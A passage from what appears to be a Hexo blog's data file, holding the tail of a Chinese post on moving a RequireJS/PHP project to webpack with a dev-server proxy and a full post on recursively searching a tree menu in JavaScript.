class=\"string\">'./Public/dev/page/main.js'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  output: &#123;</span><br><span class=\"line\">    path: config.build.assetsRoot,</span><br><span class=\"line\">    filename: <span class=\"string\">'[name].js'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"built_in\">module</span>: &#123;</span><br><span class=\"line\">    rules: [  &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 各种loaders</span></span><br><span class=\"line\">    &#125; ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  plugins: [</span><br><span class=\"line\">    <span class=\"keyword\">new</span> HtmlWebpackPlugin( &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 模板生成后的文件名（可以加上路径）</span></span><br><span class=\"line\">      filename: <span class=\"string\">'index.html'</span>,</span><br><span class=\"line\">      <span class=\"comment\">// 入口文件的模板（也就是承载你页面视图的地方）</span></span><br><span class=\"line\">      template: <span class=\"string\">'index.html'</span>,</span><br><span class=\"line\">      inject: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>抛开其他杂七杂八配置不谈，上面的配置就是大多数的<code>SPA</code>应用的配置。用在我们的项目里，在根目录运行<code>webpack</code>会发现发生错误，并提示缺少很多的模块，因为这些我们自定义的模块<code>webpack</code>本身并不能识别，所以这里有至关重要的一步，将现有的<code>requirejs</code>的配置文件里的<code>paths</code>同步迁移到<code>webpack</code>的配置文件里</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在requirejs配置文件里可能是这样写的</span></span><br><span class=\"line\"><span class=\"built_in\">require</span>.config( &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  paths: &#123;</span><br><span class=\"line\">    header: <span class=\"string\">'./modules/header'</span>,</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 那么我们就应该将此配置交给webpack</span></span><br><span class=\"line\">resolve: &#123;</span><br><span class=\"line\">  alias: &#123;</span><br><span class=\"line\">    header: <span class=\"string\">'modules/header'</span> <span class=\"comment\">// 路径可能不一定是这个</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后我们再打包，运行，发现丫的居然会报错了？最明显的错误就是<code>define is not defined</code>。让我们来翻翻上面我们<strong>准现代期</strong>的代码</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// individual</span></span><br><span class=\"line\">define( [</span><br><span class=\"line\">  <span class=\"string\">'constants'</span>,</span><br><span class=\"line\">  <span class=\"string\">'utils'</span></span><br><span class=\"line\">], <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> consts, utils </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> aa = consts.aa;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> bb = consts.bb;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">var</span> tempStr = utils.replaceStr(<span class=\"string\">'tempStr'</span>);</span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>这里的<code>define</code>就是报错的原因（<code>webpack</code>有时候并不能识别这里，有时候却又能正确转换成能运行的代码，没有深究这里的原因，虽然<code>webpack2</code>已经支持AMD风格的代码打包，但是我还是决定对这里稍作修改，变成CMD风格，即使是使用<code>CMD</code>风格的<code>seajs</code>依然是需要去掉外面那层包裹的函数的，不管怎样都得改）,于是我们只需要将上面的代码调整为：</p>\n<hr>\n<p>2017年7月24日22点50分更新，经过我的尝试，只要配置依赖都正确，完全可以直接打包，不用非得改成CMD，于是换成<code>webpack</code>更轻松了~~😝</p>\n<hr>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> consts = <span class=\"built_in\">require</span>(<span class=\"string\">'constants'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> utils = <span class=\"built_in\">require</span>(<span class=\"string\">'utils'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> aa = consts.aa;</span><br><span class=\"line\"><span class=\"keyword\">var</span> bb = consts.bb;</span><br><span class=\"line\"><span class=\"keyword\">var</span> tempStr = utils.replaceStr(<span class=\"string\">'tempStr'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果这里有return的话需要将return obj调整为</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = obj;</span><br></pre></td></tr></table></figure>\n<p>至此我们再打包便可以轻轻松松合并了（当然如果你要提取公共代码的话又是另外一个插件了，这里不再赘述）</p>\n<p>打包发布的问题解决了，最重要的一环<strong>开发环境的搭建</strong>呢？</p>\n<p>其实机智的我早料到这种配置在我们的项目并不完美，因为<code>HtmlWebpackPlugin</code>这个插件需要的模板是放在硬盘里的静态文件模板，它会自动插入构建好的<code>js</code>和<code>css</code>文件，我们的模板不是静态的，是从php后端渲染的一段动态的html，还是作死试了试，果然出现了以下情况</p>\n<ul>\n<li>动态引用的<code>header、footer</code>不见了</li>\n<li>页面出现一堆后端模板的语法<code>{$xxx}{$yyy}{$zzz}</code></li>\n</ul>\n<p>其实<code>webpack-dev-server</code>提供了一个代理功能，那这里的问题解决起来就美滋滋了。单纯的我最先的配置是这样的：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> express = <span class=\"built_in\">require</span>( <span class=\"string\">'express'</span> )</span><br><span class=\"line\"><span class=\"keyword\">var</span> proxyMiddleware = <span class=\"built_in\">require</span>( <span class=\"string\">'http-proxy-middleware'</span> )</span><br><span class=\"line\"><span class=\"keyword\">var</span> app = express();</span><br><span class=\"line\"><span class=\"comment\">// 这是代理的</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> proxyTable = &#123;</span><br><span class=\"line\">  <span class=\"string\">'/'</span>: &#123;</span><br><span class=\"line\">    target: <span class=\"string\">'http://xxxx.cn/'</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.keys( proxyTable ).forEach( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> context </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> options = proxyTable[ context ]</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"keyword\">typeof</span> options === <span class=\"string\">'string'</span> ) &#123;</span><br><span class=\"line\">    options = &#123;</span><br><span class=\"line\">      target: options</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 应用代理地址和代理目标</span></span><br><span class=\"line\">  app.use( proxyMiddleware( options.filter || context, options ) )</span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p>以上代码将我们所有的请求路径一股脑全部代理给后端<code>php</code>服务了，<code>HtmlWebpackPlugin</code>这个插件会自动写入依赖的脚本文件和样式表文件，但是此时的文件是<code>webpack-dev-server</code>服务生成的，并且存在于内存里，所以此时我们再运行<code>webpack</code>开启的服务，就会造成页面出来了(包括任何动态从服务端渲染的数据)，但是样式和<code>js</code>都没有加载，因为请求被代理到了后端，后端的目录里并不存在这些文件（废话么），所以我们需要过滤掉这些特定的请求不让<code>http-proxy-middleware</code>插件进行代理，为了区分这些特定的请求，我们将<code>entry</code>字段里的文件名都加上一个前缀<code>__webpack</code>或任何独一无二的与后台请求开头不一样的字符串，此时<code>proxyTable</code>里的<code>filter</code>函数就派上用场了，查看官方文档是这么描述这个函数的</p>\n<blockquote>\n<p>For full control you can provide a custom function to determine which requests should be proxied or not.</p>\n</blockquote>\n<blockquote>\n<p>为了完全控制你的请求，你可以定义一个函数来确定这些请求是否应该被提交</p>\n</blockquote>\n<p>于是我终于拿出一个满意的代理配置文件，开心得我仿佛升职加薪了一样😁</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> proxyTable = &#123;</span><br><span class=\"line\">  <span class=\"string\">'/'</span>: &#123;</span><br><span class=\"line\">    target: <span class=\"string\">'http://xxx.cn/'</span>,</span><br><span class=\"line\">    changeOrigin: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    filter( pathname, req ) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> !<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>( <span class=\"string\">`^\\/(__webpack|<span class=\"subst\">$&#123;assetsSubDirectory&#125;</span>)`</span> ).test( pathname );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>让我来解释一下上面的代码：未匹配到以<code>__webpack</code>开头的请求，都进行代理，这里添加了一个<code>assetsSubDirectory</code>变量，这个变量其实是webpack生成的<strong>图片、字体文件、json文件、svg</strong>等仍然存在于内存里的引用的路径，因为在内存里随着我们的编码可能实时变动，所以它们还是不需要做代理，直接过滤掉。</p>\n<p>对了，遗漏了一个很重要的配置，代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plugins: [</span><br><span class=\"line\">  <span class=\"keyword\">new</span> HtmlWebpackPlugin( &#123;</span><br><span class=\"line\">    alwaysWriteToDisk: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"comment\">// php端使用到的模板</span></span><br><span class=\"line\">    filename: <span class=\"string\">`<span class=\"subst\">$&#123;ROOT&#125;</span>/Application/Home/View/Index/index.html`</span>,</span><br><span class=\"line\">    <span class=\"comment\">// 模板文件</span></span><br><span class=\"line\">    template: <span class=\"string\">`<span class=\"subst\">$&#123;ROOT&#125;</span>/Application/Home/View-template/Index/index.html`</span>,</span><br><span class=\"line\">    chunks: [ <span class=\"string\">'__webpack-indexController'</span> ],</span><br><span class=\"line\">    inject: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>机智的我们肯定能发现<code>View-template</code>这里的不同，见名知意，这个文件夹里的html都是对应的后端的模板视图文件，我们通过<code>alwaysWriteToDisk</code>这个参数（其实还需要配合另外一个插件）以<code>template</code>字段的值为目标，实时写入到<code>filename</code>对应的文件里，而此时，因为浏览器访问的页面里因为我们启动<code>webpack-dev-server</code>时已经编译了这个文件，js会主动和webpack服务建立一个<code>eventSource</code>长连接（这个连接也是排除在代理范围内的）来监听文件变化，所以就会自动刷新浏览器，从而实现我们的<code>live-reload</code>。</p>\n<p>至此，从<code>准现代期</code>到<code>现代期</code>的过渡方案就算是完成了，接下面便是寻找一个合适的时间点实施到项目中去。若你要问我那么多页面是不是全都一个个得配，当然是，但是为了方便易维护，能不侵入现有项目去修改文件名，我们肯定需要去手动编写一个<code>map</code>映射文件，来指明我们的模板文件对应的入口文件，通过这个map我们再来动态生成<code>entry</code>和<code>HtmlWebpackPlugin</code>需要的模板路径，当然这里并不是没有便捷的办法，我们可以写一个脚本去读取<code>View-template</code>下面的目录来自动生成map但是因为我们童鞋在命名的时候文件夹和对应的入口文件并不能对应上，就得修改，这并不是推荐的做法，而且也不方便我们在改造代码风格的时候进行单个调试。</p>\n<p>上面的示例代码都不是完整的，因为我并不是要提供一个<code>webpack</code>的教程，而是解决后端和前端html耦合的<code>webpack-dev-server</code>配置的问题。</p>\n"},{"title":"使用递归函数对树形菜单进行搜索","catalog":true,"date":"2017-11-24T05:55:24.000Z","subtitle":null,"header-img":"post/IMG_3161.JPG","_content":"\n之前对递归函数的理解还仅仅停留在书面，就是说从来没有在实际中用到过，不知道是运气好还是运气不好，做了这么久开发居然没碰到这种需求。不过倒是在`jQuery`的源码里目睹了使用递归算法的地方，`jQuery.extend`方法相信很多高玩都用过，用于拷贝对象，并且提供了深拷贝，这里的递归就是为了能够遍历对象内的对象内的对象内的对象...，这种数据我们总不能一直写下去把 😂，况且逻辑还是重复的。所以这里使用递归算法就巧妙的解决了这个问题。近日朋友在解决一个菜单搜索时遇到一个问题，这么个样子\n\n![效果图](20171124140432.jpg)\n\n需求是匹配到关键字的菜单及其子菜单显示出来，就是说只要当前的菜单项匹配到了，那子菜单也全部显示。\n天真的我以为用个`[].fitler`函数就行了，直到我看到了数据是这样的\n```json\n[ {\n  text: \"菜单1\",\n  nodes: [ {\n    text: \"菜单1—菜单1\"\n    nodes: ...\n  }, {\n    text: \"菜单1—菜单2\"\n    nodes: ...\n  } ]\n}, {\n  text: \"菜单2\",\n  nodes: [ {\n    text: \"菜单2—菜单1\"\n    nodes: ...\n  } ]\n} ]\n```\n就是说不知道菜单里有多少子菜单，所以去遍历就必须得用递归调用，将符合条件的菜单保留，好在最后解决了这个问题，下面贴出代码\n\n```js\n/**\n * \n * @param {*} arrayData 需要递归的数据 \n * @param {*} searchText 搜索关键字\n */\nfunction recursionSearch( arrayData, searchText ) {\n  // 声明一个新的数组，不去操作原先的数据\n  let newArry = [];\n  // 第一层数据直接是菜单，所以不需要取nodes\n  arrayData = arrayData.nodes || arrayData\n  // 循环读取菜单数据\n  for ( let i = 0, item; item = arrayData[ i++ ]; ) {\n\n    // 菜单名称模糊查询\n    if ( item.text && item.text.indexOf( searchText ) > -1 ) {\n      // 条件满足就直接保留，不需要再遍历查找子菜单的项目\n      newArry.push( item );\n    } else {\n      // 判断是否还有子菜单\n      if ( item.nodes ) {\n        // 子菜单存在，再走一次这个流程，将筛选出来的数据直接重新赋值给nodes\n        let result = recursionSearch( item, searchText );\n        if ( result.length ) {\n          item.nodes = result;\n          // 将结果放进新的item\n          newArry.push( item )\n        }\n      }\n    }\n  }\n  // 把筛选结果返回出去\n  return newArry;\n}\n```\n结果终究是出来了，居然花了一个多小时，中间一度要放弃了，但是秉着“老司机”的光环坚持弄出来了，还是蛮开心的。令人汗颜的是花了这么久。(lll￢ω￢)\n\n//-----------------更新----------------\n如果这里需求变了，不再按照title来检索，而是检索disabled的项目，或者其他条件呢，上面的递归函数则需要变动一下，将检索条件开放出来由调用者自己来决定\n```js\nfunction recursionFilter( arrayData, filter ) {\n  let newArry = [];\n  arrayData = arrayData.nodes || arrayData\n  for ( let i = 0, item; item = arrayData[ i++ ]; ) {\n\n    if ( filter( item ) ) {\n      newArry.push( item );\n    } else {\n      if ( item.nodes ) {\n        let result = recursionFilter( item, filter );\n        if ( result.length ) {\n          item.nodes = result;\n          newArry.push( item )\n        }\n      }\n    }\n  }\n  return newArry;\n}\n\n// 调用者\nlet result = recursionFilter( treeData, function( item ) {\n  return item.state.check === true\n} )\n```\n`filter`参数就是调用者传递的回调参数，执行的结果应该是一个boolean值来确定当前项目是否符合检索条件。\n\n","source":"_posts/recursion-function.md","raw":"---\ntitle: 使用递归函数对树形菜单进行搜索\ncatalog: true\ndate: 2017-11-24 13:55:24\nsubtitle: \nheader-img: post/IMG_3161.JPG\ntags:\n- recursion\n---\n\n之前对递归函数的理解还仅仅停留在书面，就是说从来没有在实际中用到过，不知道是运气好还是运气不好，做了这么久开发居然没碰到这种需求。不过倒是在`jQuery`的源码里目睹了使用递归算法的地方，`jQuery.extend`方法相信很多高玩都用过，用于拷贝对象，并且提供了深拷贝，这里的递归就是为了能够遍历对象内的对象内的对象内的对象...，这种数据我们总不能一直写下去把 😂，况且逻辑还是重复的。所以这里使用递归算法就巧妙的解决了这个问题。近日朋友在解决一个菜单搜索时遇到一个问题，这么个样子\n\n![效果图](20171124140432.jpg)\n\n需求是匹配到关键字的菜单及其子菜单显示出来，就是说只要当前的菜单项匹配到了，那子菜单也全部显示。\n天真的我以为用个`[].fitler`函数就行了，直到我看到了数据是这样的\n```json\n[ {\n  text: \"菜单1\",\n  nodes: [ {\n    text: \"菜单1—菜单1\"\n    nodes: ...\n  }, {\n    text: \"菜单1—菜单2\"\n    nodes: ...\n  } ]\n}, {\n  text: \"菜单2\",\n  nodes: [ {\n    text: \"菜单2—菜单1\"\n    nodes: ...\n  } ]\n} ]\n```\n就是说不知道菜单里有多少子菜单，所以去遍历就必须得用递归调用，将符合条件的菜单保留，好在最后解决了这个问题，下面贴出代码\n\n```js\n/**\n * \n * @param {*} arrayData 需要递归的数据 \n * @param {*} searchText 搜索关键字\n */\nfunction recursionSearch( arrayData, searchText ) {\n  // 声明一个新的数组，不去操作原先的数据\n  let newArry = [];\n  // 第一层数据直接是菜单，所以不需要取nodes\n  arrayData = arrayData.nodes || arrayData\n  // 循环读取菜单数据\n  for ( let i = 0, item; item = arrayData[ i++ ]; ) {\n\n    // 菜单名称模糊查询\n    if ( item.text && item.text.indexOf( searchText ) > -1 ) {\n      // 条件满足就直接保留，不需要再遍历查找子菜单的项目\n      newArry.push( item );\n    } else {\n      // 判断是否还有子菜单\n      if ( item.nodes ) {\n        // 子菜单存在，再走一次这个流程，将筛选出来的数据直接重新赋值给nodes\n        let result = recursionSearch( item, searchText );\n        if ( result.length ) {\n          item.nodes = result;\n          // 将结果放进新的item\n          newArry.push( item )\n        }\n      }\n    }\n  }\n  // 把筛选结果返回出去\n  return newArry;\n}\n```\n结果终究是出来了，居然花了一个多小时，中间一度要放弃了，但是秉着“老司机”的光环坚持弄出来了，还是蛮开心的。令人汗颜的是花了这么久。(lll￢ω￢)\n\n//-----------------更新----------------\n如果这里需求变了，不再按照title来检索，而是检索disabled的项目，或者其他条件呢，上面的递归函数则需要变动一下，将检索条件开放出来由调用者自己来决定\n```js\nfunction recursionFilter( arrayData, filter ) {\n  let newArry = [];\n  arrayData = arrayData.nodes || arrayData\n  for ( let i = 0, item; item = arrayData[ i++ ]; ) {\n\n    if ( filter( item ) ) {\n      newArry.push( item );\n    } else {\n      if ( item.nodes ) {\n        let result = recursionFilter( item, filter );\n        if ( result.length ) {\n          item.nodes = result;\n          newArry.push( item )\n        }\n      }\n    }\n  }\n  return newArry;\n}\n\n// 调用者\nlet result = recursionFilter( treeData, function( item ) {\n  return item.state.check === true\n} )\n```\n`filter`参数就是调用者传递的回调参数，执行的结果应该是一个boolean值来确定当前项目是否符合检索条件。\n\n","slug":"recursion-function","published":1,"updated":"2017-12-06T01:51:26.748Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjw1000wi4ucr7apk4ml","content":"<p>之前对递归函数的理解还仅仅停留在书面，就是说从来没有在实际中用到过，不知道是运气好还是运气不好，做了这么久开发居然没碰到这种需求。不过倒是在<code>jQuery</code>的源码里目睹了使用递归算法的地方，<code>jQuery.extend</code>方法相信很多高玩都用过，用于拷贝对象，并且提供了深拷贝，这里的递归就是为了能够遍历对象内的对象内的对象内的对象…，这种数据我们总不能一直写下去把 😂，况且逻辑还是重复的。所以这里使用递归算法就巧妙的解决了这个问题。近日朋友在解决一个菜单搜索时遇到一个问题，这么个样子</p>\n<p><img src=\"20171124140432.jpg\" alt=\"效果图\"></p>\n<p>需求是匹配到关键字的菜单及其子菜单显示出来，就是说只要当前的菜单项匹配到了，那子菜单也全部显示。<br>\n天真的我以为用个<code>[].fitler</code>函数就行了，直到我看到了数据是这样的</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[ &#123;</span><br><span class=\"line\">  text: \"菜单1\",</span><br><span class=\"line\">  nodes: [ &#123;</span><br><span class=\"line\">    text: \"菜单1—菜单1\"</span><br><span class=\"line\">    nodes: ...</span><br><span class=\"line\">  &#125;, &#123;</span><br><span class=\"line\">    text: \"菜单1—菜单2\"</span><br><span class=\"line\">    nodes: ...</span><br><span class=\"line\">  &#125; ]</span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">  text: \"菜单2\",</span><br><span class=\"line\">  nodes: [ &#123;</span><br><span class=\"line\">    text: \"菜单2—菜单1\"</span><br><span class=\"line\">    nodes: ...</span><br><span class=\"line\">  &#125; ]</span><br><span class=\"line\">&#125; ]</span><br></pre></td></tr></table></figure>\n<p>就是说不知道菜单里有多少子菜单，所以去遍历就必须得用递归调用，将符合条件的菜单保留，好在最后解决了这个问题，下面贴出代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\"> * @param &#123;*&#125; arrayData 需要递归的数据 </span></span><br><span class=\"line\"><span class=\"comment\"> * @param &#123;*&#125; searchText 搜索关键字</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">recursionSearch</span>(<span class=\"params\"> arrayData, searchText </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 声明一个新的数组，不去操作原先的数据</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> newArry = [];</span><br><span class=\"line\">  <span class=\"comment\">// 第一层数据直接是菜单，所以不需要取nodes</span></span><br><span class=\"line\">  arrayData = arrayData.nodes || arrayData</span><br><span class=\"line\">  <span class=\"comment\">// 循环读取菜单数据</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> i = <span class=\"number\">0</span>, item; item = arrayData[ i++ ]; ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 菜单名称模糊查询</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( item.text &amp;&amp; item.text.indexOf( searchText ) &gt; <span class=\"number\">-1</span> ) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 条件满足就直接保留，不需要再遍历查找子菜单的项目</span></span><br><span class=\"line\">      newArry.push( item );</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 判断是否还有子菜单</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( item.nodes ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 子菜单存在，再走一次这个流程，将筛选出来的数据直接重新赋值给nodes</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> result = recursionSearch( item, searchText );</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( result.length ) &#123;</span><br><span class=\"line\">          item.nodes = result;</span><br><span class=\"line\">          <span class=\"comment\">// 将结果放进新的item</span></span><br><span class=\"line\">          newArry.push( item )</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 把筛选结果返回出去</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> newArry;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结果终究是出来了，居然花了一个多小时，中间一度要放弃了，但是秉着“老司机”的光环坚持弄出来了，还是蛮开心的。令人汗颜的是花了这么久。(lll￢ω￢)</p>\n<p>//-----------------更新----------------<br>\n如果这里需求变了，不再按照title来检索，而是检索disabled的项目，或者其他条件呢，上面的递归函数则需要变动一下，将检索条件开放出来由调用者自己来决定</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">recursionFilter</span>(<span class=\"params\"> arrayData, filter </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> newArry = [];</span><br><span class=\"line\">  arrayData = arrayData.nodes || arrayData</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> i = <span class=\"number\">0</span>, item; item = arrayData[ i++ ]; ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( filter( item ) ) &#123;</span><br><span class=\"line\">      newArry.push( item );</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( item.nodes ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> result = recursionFilter( item, filter );</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( result.length ) &#123;</span><br><span class=\"line\">          item.nodes = result;</span><br><span class=\"line\">          newArry.push( item )</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> newArry;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用者</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> result = recursionFilter( treeData, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> item </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> item.state.check === <span class=\"literal\">true</span></span><br><span class=\"line\">&#125; 